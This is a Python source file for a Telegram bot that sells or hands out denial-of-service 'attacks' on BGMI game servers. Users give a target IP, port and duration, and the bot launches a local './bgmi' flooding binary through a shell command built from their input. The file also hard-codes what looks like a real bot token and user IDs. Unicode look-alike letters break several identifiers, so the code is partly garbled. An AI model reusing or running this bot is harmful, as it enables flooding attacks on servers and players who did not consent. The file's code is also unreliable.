import logging
import asyncio
import io
from datetime import datetime, timedelta, timezone
from PIL import Image
import imagehash
from telegram import ChatPermissions, Update
from telegram.ext import (
    Application, MessageHandler, filters, CallbackContext, CommandHandler
)

# Logging setup
logging.basicConfig(level=logging.INFO)

# Bot Token & Group ID
TOKEN = "7473248262:AAGSTVPyhhk8Qumr4gMPyzHsq4AGUFDOghg"  # Replace with actual bot token
CHANNEL_ID = -1002142855213  # Replace with your group/channel ID

# Attack & Cooldown Config
COOLDOWN_DURATION = 60  # 60 sec cooldown
DAILY_ATTACK_LIMIT = 5000  # Max daily attacks
EXEMPTED_USERS = [1332360551,1419969308,1844249543]  # Users with no cooldown

user_attacks = {}  # Tracks number of attacks per user
user_cooldowns = {}  # Tracks cooldown time per user
user_photos = {}  # Tracks feedback status per user
image_hashes = {}  # Tracks duplicate images

# Function to calculate image hash
async def get_image_hash(bot, file_id):
    new_file = await bot.get_file(file_id)
    image_bytes = await new_file.download_as_bytearray()
    image = Image.open(io.BytesIO(image_bytes))
    return str(imagehash.average_hash(image))

# Function to handle duplicate images and mute users
async def handle_images(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    chat_id = update.message.chat_id

    if update.message.photo:
        file_id = update.message.photo[-1].file_id
        img_hash = await get_image_hash(context.bot, file_id)

        if img_hash in image_hashes:
            mute_duration = 15  # Mute for 15 minutes
            unmute_time = datetime.now(timezone.utc) + timedelta(minutes=mute_duration)  # Convert to UTC

            # Mute the user
            await context.bot.restrict_chat_member(
                chat_id, user_id, ChatPermissions(can_send_messages=False), until_date=unmute_time
            )

            # Send mute notification without time info
            await update.message.reply_text(
                f"⚠️ @{update.message.from_user.username} 𝘿𝙪𝙥𝙡𝙞𝙘𝙖𝙩𝙚 𝙋𝙝𝙤𝙩𝙤 𝘽𝙚𝙟𝙞!\n"
                f"⏳ 𝘿𝙪𝙥𝙡𝙞𝙘𝙖𝙩𝙚 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙃𝙖𝙞 𝙍𝙚𝙖𝙡 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝘿𝙤 𝙄𝙨𝙞𝙡𝙮𝙚 𝘼𝙥𝙠𝙤 {mute_duration} 𝙈𝙞𝙣 𝙆𝙚 𝙇𝙞𝙮𝙚 𝙈𝙪𝙩𝙚 𝙆𝙞𝙮𝙖 𝙅𝙖𝙩𝙖 𝙃𝙖𝙞."
            )

            # Schedule auto-unmute
            context.job_queue.run_once(unmute_user, mute_duration * 60, data={"𝙘𝙝𝙖𝙩_𝙞𝙙": chat_id, "𝙪𝙨𝙚𝙧_𝙞𝙙": user_id})

        else:
            image_hashes[img_hash] = user_id
            user_photos[user_id] = True  # Mark feedback as given
            await update.message.reply_text("✅ 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙍𝙚𝙘𝙚𝙞𝙫𝙚𝙙! 𝘼𝙗 𝘼𝙖𝙥 𝙉𝙚𝙭𝙩 𝘼𝙩𝙩𝙖𝙘𝙠 𝙆𝙖𝙧 𝙎𝙖𝙠𝙩𝙚 𝙃𝙤")

# Function to unmute user
async def unmute_user(context: CallbackContext):
    job_data = context.job.data
    chat_id, user_id = job_data["𝙘𝙝𝙖𝙩_𝙞𝙙"], job_data["𝙪𝙨𝙚𝙧_𝙞𝙙"]

    await context.bot.restrict_chat_member(chat_id, user_id, ChatPermissions(can_send_messages=True))
    await context.bot.send_message(chat_id, f"✅ @{user_id} 𝙆𝙖 𝙈𝙪𝙩𝙚 𝙃𝙖𝙩 𝙂𝙖𝙮𝙖!")
    
# BGMI Attack Command Handler
async def bgmi_command(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    chat_id = update.message.chat_id

    if chat_id != CHANNEL_ID:
        await update.message.reply_text("⚠️ 𝘽𝙤𝙩 𝙎𝙞𝙧𝙛 𝘼𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝘾𝙝𝙖𝙣𝙣𝙚𝙡𝙨 𝙋𝙖𝙧 𝙆𝙖𝙖𝙢 𝙆𝙖𝙧𝙚𝙜𝙖!")
        return

    # Check cooldown
    if user_id in user_cooldowns and datetime.now() < user_cooldowns[user_id]:
        remaining_time = (user_cooldowns[user_id] - datetime.now()).seconds
        await update.message.reply_text(f"⚠️ 𝘾𝙤𝙡𝙙𝙤𝙬𝙣 𝘼𝙘𝙩𝙞𝙫𝙚! {remaining_time // 60} min {remaining_time % 60} 𝙎𝙚𝙘 𝙍𝙪𝙠𝙤.")
        return

    # Check attack limit
    if user_id not in user_attacks:
        user_attacks[user_id] = 0
    if user_attacks[user_id] >= DAILY_ATTACK_LIMIT:
        await update.message.reply_text("🚀 𝙏𝙪𝙢𝙝𝙖𝙧𝙖 𝘿𝙖𝙞𝙡𝙮 𝘼𝙩𝙩𝙖𝙘𝙠 𝙇𝙞𝙢𝙞𝙩 𝙆𝙝𝙖𝙩𝙖𝙢 𝙃𝙤 𝙂𝙖𝙮𝙖, 𝙆𝙖𝙡 𝙏𝙧𝙮 𝙆𝙖𝙧𝙤!")
        return

    # Check if feedback photo is given
    if user_attacks[user_id] > 0 and not user_photos.get(user_id, False):
        await update.message.reply_text("⚠️ 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙉𝙖𝙝𝙞 𝘿𝙞𝙮𝙖, 𝙋𝙝𝙖𝙡𝙚 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙋𝙝𝙤𝙩𝙤 𝘽𝙝𝙚𝙟𝙤!")
        return

    try:
        args = context.args
        if len(args) != 3:
            raise ValueError("⚙ 𝙁𝙤𝙧𝙢𝙖𝙩: /𝙗𝙜𝙢𝙞 <𝙄𝙋> <𝙋𝙤𝙧𝙩> <𝘿𝙪𝙧𝙖𝙩𝙞𝙤𝙣>")

        target_ip, target_port, user_duration = args
        if not target_ip.replace('.', '').isdigit() or not target_port.isdigit() or not user_duration.isdigit():
            raise ValueError("⚠️ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙄𝙣𝙥𝙪𝙩! 𝙎𝙖𝙝𝙞 𝙁𝙤𝙧𝙢𝙖𝙩 𝙈𝙚 𝙇𝙞𝙠𝙝𝙤.")

        # Increase attack count
        user_attacks[user_id] += 1
        user_photos[user_id] = False  # Reset feedback requirement
        user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)

        await update.message.reply_text(
            f"🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙎𝙩𝙖𝙧𝙩 𝙊𝙉 {target_ip}:{target_port} 𝙁𝙤𝙧 240 𝙎𝙚𝙘𝙤𝙣𝙙𝙨! \n❗ 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙋𝙝𝙤𝙩𝙤 𝘽𝙝𝙚𝙟𝙣𝙖 𝙈𝙖𝙩 𝘽𝙝𝙤𝙤𝙡𝙣𝙖."
        )

        # Run attack command
        asyncio.create_task(run_attack_command_async(target_ip, int(target_port), 240, chat_id, context.bot))

    except Exception as e:
        await update.message.reply_text(str(e))

# Function to run attack command and send completion message
async def run_attack_command_async(target_ip, target_port, duration, chat_id, bot):
    try:
        command = f"./𝙗𝙜𝙢𝙞 {target_ip} {target_port} {duration} 1200"
        process = await asyncio.create_subprocess_shell(command)
        await process.communicate()

        # Attack finish hone ka message bhejo
        await bot.send_message(chat_id, f"✅ 𝘼𝙩𝙩𝙖𝙘𝙠 𝙁𝙞𝙣𝙞𝙨𝙝𝙚𝙙 𝙊𝙉 {target_ip}:{target_port}")
        logging.info(f"✅ 𝘼𝙩𝙩𝙖𝙘𝙠 𝙁𝙞𝙣𝙞𝙨𝙝𝙚𝙙 𝙊𝙉 {target_ip}:{target_port}")
    except Exception as e:
        logging.error(f"𝙀𝙧𝙧𝙤𝙧: {e}")

# Main function to run the bot
def main():
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("𝙗𝙜𝙣𝙞", bgmi_command))
    application.add_handler(MessageHandler(filters.PHOTO, handle_images))

    logging.info("𝘽𝙤𝙩 𝙞𝙨 𝙧𝙪𝙣𝙣𝙞𝙣𝙜...")
    application.run_polling()

if __name__ == "__𝙢𝙖𝙞𝙣__":
    main()
